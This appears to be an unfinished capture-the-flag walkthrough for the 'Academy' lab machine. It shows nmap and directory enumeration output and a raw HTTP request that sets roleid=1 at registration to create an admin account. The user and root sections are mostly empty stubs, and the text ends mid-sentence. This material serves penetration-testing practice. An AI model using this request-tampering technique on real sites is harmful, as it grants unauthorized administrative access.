# Academy
```
Difficulty: Easy
Operating System: Linux
Hints: True
```
## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
As we can se we have only port 22 and 80 opened, so without further doing let's dig into port 80.  
Before openinig port 80 we can see in nmap that the site is performing a redirection to ```Did not follow redirect to http://academy.htb/``` so let's set up this host in our /etc/hosts file and let's start enumerating webserver.  
First thing, hitting the website, we can see an 'acedemy' page. The page shows an image and nothing more, so, let's start enumerating the webserver looking for files and directories:  
```
/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
/home.php             (Status: 302) [Size: 55034] [--> login.php]
/admin.php            (Status: 200) [Size: 2633]
/login.php            (Status: 200) [Size: 2627]
/.                    (Status: 200) [Size: 2117]
/index.php            (Status: 200) [Size: 2117]
/register.php         (Status: 200) [Size: 3003]
/config.php           (Status: 200) [Size: 0]
```
as we can see we discovered various links.  
Now we can try various scan, but at least, if we try to register a new account with the roleid (found in the registration request set to 1) we can register an admin account.  
```
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://academy.htb
Connection: close
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=bv9043rgksnjungmplpk3ktqtn
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

uid=b0d&password=Password&confirm=Password&roleid=1
```
After we register the account we can login with the given credentials to admin.php, here we can find the below information:  
![[Pasted image 20220518103850.png]]
## Foothold (optional)

## User
### Method 1 - Technique 1
### Method 2 - Technique 2

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice
